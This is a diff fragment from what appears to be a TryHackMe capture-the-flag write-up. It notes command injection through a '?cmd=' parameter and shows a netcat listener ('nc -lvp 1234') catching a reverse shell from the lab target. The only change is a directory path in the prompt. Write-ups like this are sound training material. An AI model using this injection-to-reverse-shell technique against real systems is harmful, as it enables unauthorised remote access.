@@ -150,7 +150,7 @@ So it looks like we can enter commands using a `?cmd=` variable. Let's try to in
 Nice, so it looks like we can inject a nc reverse shell, and catching the shell works!
 
 ```bash
-jeffrowell@kali:~/Documents/eCPPT/Network_Security/Information Gathering$ nc -lvp 1234
+jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ nc -lvp 1234
 listening on [any] 1234 ...
 10.10.111.20: inverse host lookup failed: Unknown host
 connect to [10.8.21.42] from (UNKNOWN) [10.10.111.20] 60118
